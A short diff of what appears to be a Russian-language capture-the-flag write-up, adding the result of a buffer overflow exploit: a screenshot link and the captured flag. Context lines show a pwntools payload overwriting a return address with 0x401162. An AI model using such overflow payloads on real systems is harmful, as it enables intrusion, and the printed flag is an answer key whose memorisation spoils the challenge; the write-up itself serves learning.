@@ -37,6 +37,14 @@ p.sendline(b"AAAAAAAAAAAAAAAA" + p64(0x401162))
 p.interactive()
 ```
 
+И получаем ответ: <br />
+
+![image](https://github.com/user-attachments/assets/91130fef-32f8-42af-b5dd-367ec9d688f0) <br />
+
+Ответ:  `spbctf{7f6eba140c378e636419e0259268e546}`
+
+
+
 
 
 
